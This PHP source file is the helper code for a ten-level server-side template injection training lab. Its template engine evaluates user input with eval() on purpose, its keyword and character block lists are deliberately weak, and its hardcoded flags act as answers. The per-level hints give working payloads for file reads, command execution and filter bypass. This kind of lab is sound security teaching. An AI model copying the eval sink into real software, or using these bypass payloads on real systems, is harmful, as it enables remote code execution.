<?php
/**
 * SSTI Lab - Helper Functions
 *
 * A deliberately-vulnerable, hand-rolled mini template engine plus the
 * per-level filters, verification gates, hints and flag plumbing that drive
 * the Server-Side Template Injection challenge lab.
 *
 * THE VULNERABILITY (by design): render_template() scans user input for
 * {{ ... }} expressions and evaluates whatever is inside as raw PHP via
 * eval("return ( ... )"). There is no sandbox. Each level layers a slightly
 * tighter (and slightly broken) filter on top of the same engine.
 */

/* =========================================================================
 * Core: the vulnerable mini template engine
 * ===================================================================== */

/** Absolute path to the baked secret the higher levels disclose. */
function ssti_secret_path(): string
{
    return '/var/secret/flag.txt';
}

/**
 * Evaluate a single {{ ... }} expression as PHP.
 *
 * Primary path is the intentional sink: eval("return ( $expr );").
 * If the expression is actually a statement list (e.g. the level-8 payload
 * `$f='sys'.'tem';$f('id')`), the return-wrapper fails to parse, so we fall
 * back to evaluating it as statements and capture whatever it echoes.
 *
 * @param bool $ok set to true when the expression executed without error.
 */
function ssti_eval(string $expr, bool &$ok = false): string
{
    $ok = false;
    if (trim($expr) === '') {
        return '';
    }

    $ret = null;
    ob_start();
    try {
        try {
            // ── The intentional SSTI sink ─────────────────────────────
            $ret = eval('return (' . $expr . ');');
        } catch (\ParseError $pe) {
            // Not a single expression — retry as a statement list so that
            // multi-statement payloads (variable functions) still run.
            @ob_end_clean();
            ob_start();
            eval($expr . ';');
        }
        $ok = true;
    } catch (\Throwable $e) {
        while (ob_get_level() > 0) {
            @ob_end_clean();
        }
        $ok = false;
        return '';
    }

    $printed = ob_get_clean();
    if ($printed !== '' && $printed !== null) {
        // system()/passthru()/echo write straight to the output buffer.
        return $printed;
    }
    if (is_array($ret)) {
        return print_r($ret, true);
    }
    if (is_bool($ret)) {
        return $ret ? '1' : '';
    }
    if ($ret === null) {
        return '';
    }
    return (string) $ret;
}

/**
 * Render a template string: every {{ ... }} block is evaluated as PHP and
 * replaced by its result. This is the heart of the vulnerability.
 *
 * @param bool $executed set true when at least one block evaluated cleanly.
 */
function render_template(string $tpl, bool &$executed = false): string
{
    $didRun = false;
    $out = preg_replace_callback(
        '/\{\{(.+?)\}\}/s',
        function (array $m) use (&$didRun): string {
            $ok = false;
            $result = ssti_eval(trim($m[1]), $ok);
            if ($ok) {
                $didRun = true;
            }
            return $result;
        },
        $tpl
    );
    $executed = $didRun;
    return $out === null ? $tpl : $out;
}

/* =========================================================================
 * Per-level filters (the "defence" each level layers on the engine)
 * ===================================================================== */

/**
 * Naive, NON-recursive delimiter stripper (levels 9 & 10).
 * Removes only the first `{{` and the last `}}` — a single unwrap pass.
 * Nesting like {{{{ ... }}}} therefore survives with one valid tag intact.
 */
function ssti_strip_outer_delims(string $input): string
{
    $s = $input;
    $p = strpos($s, '{{');
    if ($p !== false) {
        $s = substr_replace($s, '', $p, 2);
    }
    $q = strrpos($s, '}}');
    if ($q !== false) {
        $s = substr_replace($s, '', $q, 2);
    }
    return $s;
}

/**
 * Apply the filter for a level and report whether the request is allowed to
 * reach the engine and, if so, exactly what string the engine will receive.
 *
 * @return array{blocked: bool, reason: string, value: string}
 */
function apply_level_filter(int $level, string $input): array
{
    $pass    = fn(string $v): array => ['blocked' => false, 'reason' => '', 'value' => $v];
    $blocked = fn(string $r): array => ['blocked' => true, 'reason' => $r, 'value' => ''];

    switch ($level) {
        case 6:
            // Keyword blocklist — command-function names by literal substring.
            if (preg_match('/system|exec|shell_exec|passthru/i', $input)) {
                return $blocked('Keyword blocklist tripped: system / exec / shell_exec / passthru');
            }
            return $pass($input);

        case 7:
            // Character blocklist — quotes and the backtick operator.
            if (strpbrk($input, "'\"`") !== false) {
                return $blocked('Character blocklist tripped: quotes and backticks are not allowed');
            }
            return $pass($input);

        case 8:
            // Stricter keyword blocklist — also blocks call_user_func and backticks,
            // forcing variable-function indirection.
            if (preg_match('/system|exec|shell_exec|passthru|call_user_func/i', $input)) {
                return $blocked('Keyword blocklist tripped: command functions and call_user_func are blocked');
            }
            if (strpos($input, '`') !== false) {
                return $blocked('Character blocklist tripped: the backtick operator is blocked');
            }
            return $pass($input);

        case 9:
            // Non-recursive delimiter stripper only.
            return $pass(ssti_strip_outer_delims($input));

        case 10:
            // Multi-layer WAF: keyword + character + delimiter stripper.
            if (preg_match('/system|exec|shell_exec|passthru|call_user_func/i', $input)) {
                return $blocked('WAF layer 1 (keyword) tripped: command functions / call_user_func');
            }
            if (strpbrk($input, "'\"`") !== false) {
                return $blocked('WAF layer 2 (character) tripped: quotes and backticks');
            }
            return $pass(ssti_strip_outer_delims($input));

        default:
            // Levels 1-5: no filter at all.
            return $pass($input);
    }
}

/**
 * Run a level end-to-end: filter, then render. Used both for the live output
 * box and for the flag decision so the two never disagree.
 *
 * @return array{blocked: bool, reason: string, rendered: string, executed: bool}
 */
function run_ssti_level(int $level, string $input): array
{
    $res = apply_level_filter($level, $input);
    if ($res['blocked']) {
        return ['blocked' => true, 'reason' => $res['reason'], 'rendered' => '', 'executed' => false];
    }
    $executed = false;
    $rendered = render_template($res['value'], $executed);
    return ['blocked' => false, 'reason' => '', 'rendered' => $rendered, 'executed' => $executed];
}

/* =========================================================================
 * Proof-of-exploitation checks
 * ===================================================================== */

/** True when the rendered output contains the real secret file's first line. */
function ssti_output_has_secret(string $out): bool
{
    if (trim($out) === '') {
        return false;
    }
    $secret = @file_get_contents(ssti_secret_path());
    if ($secret === false) {
        return false;
    }
    $secret = trim($secret);
    if ($secret === '') {
        return false;
    }
    $firstLine = strtok($secret, "\n");
    return $firstLine !== false && strpos($out, $firstLine) !== false;
}

/** True when the rendered output shows real OS command execution. */
function ssti_output_proves_rce(string $out): bool
{
    if (trim($out) === '') {
        return false;
    }
    if (preg_match('/uid=\d+\(/', $out)) {  // `id`
        return true;
    }
    if (preg_match('/gid=\d+\(/', $out)) {  // `id`
        return true;
    }
    if (strpos($out, 'RCE_PROOF_OK') !== false) {  // e.g. system('echo RCE_PROOF_OK')
        return true;
    }
    return ssti_output_has_secret($out);  // e.g. cat /var/secret/flag.txt
}

/**
 * Decide whether a completed run earns the level's flag. Each gate confirms
 * the SPECIFIC technique the level teaches actually executed — never a string
 * match against the flag itself.
 *
 * @param array{blocked: bool, reason: string, rendered: string, executed: bool} $run
 */
function ssti_flag_earned(int $level, string $input, array $run): bool
{
    if ($input === '' || $run['blocked']) {
        return false;
    }
    $out = $run['rendered'];

    switch ($level) {
        case 1:
            // Basic injection — any {{ expr }} block evaluated.
            return $run['executed'];

        case 2:
            // Variable / superglobal access.
            return $run['executed']
                && (bool) preg_match('/\$_(SERVER|GET|POST|ENV|COOKIE|REQUEST)|\$GLOBALS|getenv\s*\(/i', $input)
                && trim($out) !== '';

        case 3:
            // Function call.
            return $run['executed']
                && (bool) preg_match('/[A-Za-z_]\w*\s*\(/', $input)
                && trim($out) !== '';

        case 4:
            // Local file disclosure — output must contain the real secret.
            return ssti_output_has_secret($out);

        case 5:
            // Remote code execution.
            return ssti_output_proves_rce($out);

        case 6:
            // Keyword bypass — filter survived + real RCE.
            return ssti_output_proves_rce($out);

        case 7:
            // Character bypass — filter survived + real RCE.
            return ssti_output_proves_rce($out);

        case 8:
            // Variable-function indirection — a $var(...) call plus real RCE.
            return ssti_output_proves_rce($out)
                && (bool) preg_match('/\$\w+\s*\(/', $input);

        case 9:
            // Nested-delimiter bypass — a tag survived the single-pass stripper.
            return $run['executed'];

        case 10:
            // Multi-layer WAF bypass — everything survived + real RCE.
            return ssti_output_proves_rce($out);

        default:
            return false;
    }
}

/**
 * Spec-named verifier: re-applies the level's filter and confirms an executing
 * vector survives. Thin wrapper over run + gate so it can be used standalone.
 */
function verify_ssti_payload(int $level, string $input): bool
{
    if ($input === '') {
        return false;
    }
    $run = run_ssti_level($level, $input);
    return ssti_flag_earned($level, $input, $run);
}

/* =========================================================================
 * Flags
 * ===================================================================== */

/** Returns the flag string for a given level ID. */
function get_flag_for_level(int $levelId): string
{
    $flags = [
        1  => 'FLAG{ssti_basic_eval}',
        2  => 'FLAG{ssti_variable_access}',
        3  => 'FLAG{ssti_function_call}',
        4  => 'FLAG{ssti_file_read}',
        5  => 'FLAG{ssti_rce}',
        6  => 'FLAG{ssti_keyword_bypass}',
        7  => 'FLAG{ssti_char_bypass}',
        8  => 'FLAG{ssti_variable_function}',
        9  => 'FLAG{ssti_nested_delimiter}',
        10 => 'FLAG{ssti_waf_bypass}',
    ];
    return $flags[$levelId] ?? '';
}

/* =========================================================================
 * Hints — exactly 5 progressive HTML hints per level
 * ===================================================================== */

/** Returns an array of 5 progressive hints for each level. */
function get_level_hints(int $levelId): array
{
    $hints = [
        1 => [
            'The greeting is produced by a hand-rolled template engine that scans your input for <code>{{ ... }}</code> expressions and evaluates whatever is inside. Anything between the double braces is treated as live PHP.',
            'Under the hood the engine runs <code>eval("return (" . $expr . ");")</code> on the text you place between <code>{{</code> and <code>}}</code>. There is <strong>no sandbox</strong> — arithmetic, strings, and function calls all execute.',
            'Prove evaluation first: submit <code>{{7*7}}</code>. If the page prints <code>49</code> instead of the literal <code>{{7*7}}</code>, your input executed server-side.',
            'Any PHP expression works: <code>{{ 2**10 }}</code>, <code>{{ strtoupper(\'abc\') }}</code>, <code>{{ 6*7 }}</code>.',
            'Working payloads: <code>{{7*7}}</code> &rarr; <code>49</code> &nbsp;|&nbsp; <code>{{ 1336+1 }}</code> &nbsp;|&nbsp; <code>{{ 6*7 }}</code>',
        ],
        2 => [
            'The block is evaluated in the <em>global</em> PHP scope, so every superglobal (<code>$_SERVER</code>, <code>$_GET</code>, <code>$_ENV</code>, <code>$GLOBALS</code>) is reachable from inside <code>{{ }}</code>.',
            'Superglobals are arrays — read a single element with array syntax: <code>{{ $_SERVER[\'SOMETHING\'] }}</code>.',
            'Read the HTTP Host header the server saw: <code>{{ $_SERVER[\'HTTP_HOST\'] }}</code>.',
            'You can dump the whole environment too: <code>{{ print_r($_SERVER, true) }}</code> or read a single env var with <code>{{ getenv(\'PATH\') }}</code>.',
            'Working payloads: <code>{{ $_SERVER[\'HTTP_HOST\'] }}</code> &nbsp;|&nbsp; <code>{{ $_SERVER[\'SERVER_SOFTWARE\'] }}</code> &nbsp;|&nbsp; <code>{{ $GLOBALS[\'_SERVER\'][\'DOCUMENT_ROOT\'] }}</code>',
        ],
        3 => [
            'Because the block is eval\'d as raw PHP, you are not limited to variables — you can call <strong>any</strong> PHP function available to the interpreter.',
            'Function calls use normal syntax inside the braces: <code>{{ functionName(arguments) }}</code>.',
            'Fingerprint the interpreter with <code>{{ phpversion() }}</code> — it returns the running PHP version.',
            'String and system-info functions all work: <code>{{ strrev(\'injection\') }}</code>, <code>{{ php_uname() }}</code>, <code>{{ md5(\'x\') }}</code>.',
            'Working payloads: <code>{{ phpversion() }}</code> &nbsp;|&nbsp; <code>{{ strrev(\'deppfirts\') }}</code> &nbsp;|&nbsp; <code>{{ php_uname() }}</code>',
        ],
        4 => [
            'If arbitrary functions run, file-reading functions run too. A secret file sits on disk at <code>/var/secret/flag.txt</code>.',
            'PHP\'s <code>file_get_contents()</code> returns the entire contents of a path as a string — exactly what a template that expects a string can render.',
            'Point it at the secret: <code>{{ file_get_contents(\'/var/secret/flag.txt\') }}</code>.',
            'Other readers work as well: <code>{{ show_source(\'/var/secret/flag.txt\') }}</code>, <code>{{ implode(file(\'/var/secret/flag.txt\')) }}</code>.',
            'Working payloads: <code>{{ file_get_contents(\'/var/secret/flag.txt\') }}</code> &nbsp;|&nbsp; <code>{{ implode(\'\', file(\'/var/secret/flag.txt\')) }}</code>',
        ],
        5 => [
            'File reads are useful, but full command execution is the prize. PHP exposes several command-execution functions to the template.',
            '<code>system()</code>, <code>shell_exec()</code>, <code>exec()</code>, <code>passthru()</code> and backticks all spawn a shell. <code>system()</code> prints its output straight into the rendered page.',
            'Prove RCE by running <code>id</code>: <code>{{ system(\'id\') }}</code>. Look for <code>uid=...</code> in the output.',
            'Backticks are the shortest vector: <code>{{ `id` }}</code> runs <code>id</code> through the shell operator.',
            'Working payloads: <code>{{ system(\'id\') }}</code> &nbsp;|&nbsp; <code>{{ `id` }}</code> &nbsp;|&nbsp; <code>{{ system(\'cat /var/secret/flag.txt\') }}</code>',
        ],
        6 => [
            'A keyword filter now rejects the request if your input contains <code>system</code>, <code>exec</code>, <code>shell_exec</code> or <code>passthru</code> (case-insensitive substring match). Calling those by their literal name is out.',
            'The filter only sees the literal characters you send. If the string <code>system</code> never appears as a contiguous substring, the filter never fires.',
            'Backticks invoke the shell without naming any blocked function: <code>{{ `id` }}</code> sails straight through.',
            'Or split the name so the substring is broken, then hand it to <code>call_user_func</code>: <code>{{ call_user_func(\'sys\'.\'tem\', \'id\') }}</code> — your input holds <code>\'sys\'.\'tem\'</code>, not <code>system</code>.',
            'Working payloads: <code>{{ `id` }}</code> &nbsp;|&nbsp; <code>{{ call_user_func(\'sys\'.\'tem\', \'id\') }}</code> &nbsp;|&nbsp; <code>{{ `cat /var/secret/flag.txt` }}</code>',
        ],
        7 => [
            'This filter blocks quote characters (<code>\'</code> and <code>"</code>) and the backtick operator. You can no longer write a string literal or use backticks.',
            'You can still build strings without quotes: <code>chr(105)</code> returns the character <code>i</code>. Concatenate <code>chr()</code> calls with <code>.</code> to spell any word.',
            '<code>chr(105).chr(100)</code> builds the string <code>id</code>. Feed it to a command function: <code>{{ system(chr(105).chr(100)) }}</code>.',
            'Alternatively, chain a second GET parameter that holds your command. Use a <em>numeric</em> key so no quotes are needed: add <code>&amp;0=id</code> to the URL and submit <code>{{ system($_GET[0]) }}</code>.',
            'Working payloads: <code>{{ system(chr(105).chr(100)) }}</code> &nbsp;|&nbsp; <code>{{ system($_GET[0]) }}</code> with <code>&amp;0=id</code> appended to the URL',
        ],
        8 => [
            'The filter now blocks the command-function names AND <code>call_user_func</code> AND backticks. Direct calls and the usual indirections are gone.',
            'PHP lets you call a function through a variable: if <code>$f</code> holds the string <code>system</code>, then <code>$f(\'id\')</code> executes <code>system(\'id\')</code>.',
            'Assemble the name in a variable so the blocked substring never appears in your input: <code>$f=\'sys\'.\'tem\';</code>.',
            'The engine accepts multiple statements in one block, so combine the assignment and the call: <code>{{ $f=\'sys\'.\'tem\';$f(\'id\') }}</code>.',
            'Working payloads: <code>{{ $f=\'sys\'.\'tem\';$f(\'id\') }}</code> &nbsp;|&nbsp; <code>{{ $f=\'sys\'.\'tem\';$f(\'cat /var/secret/flag.txt\') }}</code> &nbsp;|&nbsp; <code>{{ $x=\'pass\'.\'thru\';$x(\'id\') }}</code>',
        ],
        9 => [
            'The developer tries to "strip out template tags" before rendering. Read the source: the stripper removes only ONE outer <code>{{ ... }}</code> layer — it is not applied recursively.',
            'If you send a single <code>{{7*7}}</code>, the stripper unwraps it to <code>7*7</code> and nothing executes. You need a tag to <strong>survive</strong> the single pass.',
            'Nest the braces. The stripper removes the outermost <code>{{</code> and <code>}}</code>; a second pair inside is left untouched and reaches the engine.',
            'Wrap your real payload in an extra layer: <code>{{{{7*7}}}}</code> becomes <code>{{7*7}}</code> after stripping, which then evaluates to <code>49</code>.',
            'Working payloads: <code>{{{{7*7}}}}</code> &nbsp;|&nbsp; <code>{{{{ phpversion() }}}}</code> &nbsp;|&nbsp; <code>{{{{ system(\'id\') }}}}</code>',
        ],
        10 => [
            'Every previous defence is stacked: (1) a keyword blocklist (<code>system|exec|shell_exec|passthru|call_user_func</code>), (2) a character blocklist (quotes and backticks), and (3) the non-recursive delimiter stripper. Your vector must beat all three at once.',
            'Layer 3 means you must nest the delimiters — <code>{{{{ ... }}}}</code> — so a real tag survives the unwrap pass.',
            'Layer 2 means no quotes and no backticks, so build every string from <code>chr()</code> codes joined with <code>.</code> concatenation.',
            'Layer 1 means the word <code>system</code> must never appear literally. Assemble it from <code>chr()</code> codes into a variable and invoke it as a variable function: <code>$f=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);</code> builds <code>system</code>, then <code>$f(chr(105).chr(100))</code> runs <code>system(\'id\')</code>.',
            'Working payload: <code>{{{{ $f=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);$f(chr(105).chr(100)) }}}}</code>',
        ],
    ];
    return $hints[$levelId] ?? [];
}

/**
 * Renders a progressive hint section with a "Show Next Hint" button.
 * Each call shares the same JS listener (rendered only once via static flag).
 */
function render_hint_section(array $hints, string $title = 'Hints'): string
{
    if (empty($hints)) {
        return '';
    }
    static $scriptRendered = false;
    $id = uniqid('hint_', false);
    ob_start();
    ?>
    <div class="hints" id="<?= $id ?>">
        <h3><?= htmlspecialchars($title) ?></h3>
        <button class="hint-btn" data-hint-target="<?= $id ?>">Show Next Hint (0/<?= count($hints) ?>)</button>
        <ul class="hint-list">
            <?php foreach ($hints as $hint): ?>
            <li class="hint-item" hidden><?= $hint ?></li>
            <?php endforeach; ?>
        </ul>
    </div>
    <?php
    if (!$scriptRendered) {
        $scriptRendered = true;
        ?>
        <script>
        document.addEventListener('click', function(e) {
            if (!e.target.classList.contains('hint-btn')) return;
            const targetId = e.target.getAttribute('data-hint-target');
            const container = document.getElementById(targetId);
            const items = container.querySelectorAll('.hint-item[hidden]');
            const total = container.querySelectorAll('.hint-item').length;
            if (items.length > 0) {
                items[0].removeAttribute('hidden');
                const shown = total - items.length + 1;
                e.target.textContent = shown < total ? 'Show Next Hint (' + shown + '/' + total + ')' : 'All hints shown';
                if (shown >= total) e.target.disabled = true;
            }
        });
        </script>
        <?php
    }
    return ob_get_clean();
}

/**
 * Handle inline flag submission on a level page.
 * Only acts when POST contains _flag_submit=1.
 *
 * @return array{status: string|null, message: string, already_completed: bool}
 */
function handle_inline_flag_submit(int $levelId): array
{
    $result = ['status' => null, 'message' => '', 'already_completed' => false];

    $completed = [];
    if (!empty($_COOKIE['ssti_lab_progress'])) {
        $decoded = json_decode($_COOKIE['ssti_lab_progress'], true);
        if (is_array($decoded)) $completed = $decoded;
    }
    $result['already_completed'] = in_array($levelId, $completed);

    if ($_SERVER['REQUEST_METHOD'] !== 'POST' || empty($_POST['_flag_submit'])) {
        return $result;
    }

    $flag = trim($_POST['submitted_flag'] ?? '');
    if ($flag === '') {
        $result['status']  = 'error';
        $result['message'] = 'Please enter a flag.';
        return $result;
    }

    if ($flag === get_flag_for_level($levelId)) {
        if (!in_array($levelId, $completed)) {
            $completed[] = $levelId;
            sort($completed);
            setcookie('ssti_lab_progress', json_encode($completed), time() + 86400 * 30, '/');
        }
        $result['status']           = 'success';
        $result['message']          = 'Correct! Flag accepted.';
        $result['already_completed'] = true;
    } else {
        $result['status']  = 'error';
        $result['message'] = 'Incorrect flag. Keep trying!';
    }

    return $result;
}

/**
 * Render the compact inline flag submit form.
 *
 * @param array{status: string|null, message: string, already_completed: bool} $result
 */
function render_inline_flag_form(int $levelId, array $result): string
{
    $status           = $result['status'] ?? null;
    $message          = $result['message'] ?? '';
    $alreadyCompleted = $result['already_completed'] ?? false;

    ob_start();
    ?>
    <div class="inline-flag-submit">
        <h3>Submit Flag</h3>
        <div class="form-inner">
            <?php if ($status === 'success'): ?>
                <div class="message success"><?= htmlspecialchars($message) ?> &mdash; <a href="submit.php">view all progress &rarr;</a></div>
            <?php elseif ($status === 'error'): ?>
                <div class="message error"><?= htmlspecialchars($message) ?></div>
            <?php endif; ?>
            <?php if ($alreadyCompleted && $status !== 'success'): ?>
                <div class="message info">Level <?= (int)$levelId ?> already completed. <a href="submit.php">View progress &rarr;</a></div>
            <?php endif; ?>
            <?php if (!$alreadyCompleted || $status === 'error'): ?>
            <form method="POST" action="">
                <input type="hidden" name="_flag_submit" value="1">
                <div class="inline-flag-row">
                    <input type="text" name="submitted_flag" class="form-control"
                           placeholder="FLAG{...}" autocomplete="off" spellcheck="false"
                           value="<?= htmlspecialchars($_POST['submitted_flag'] ?? '') ?>">
                    <button type="submit" class="btn btn-primary">Check</button>
                </div>
            </form>
            <?php endif; ?>
        </div>
    </div>
    <?php
    return ob_get_clean();
}
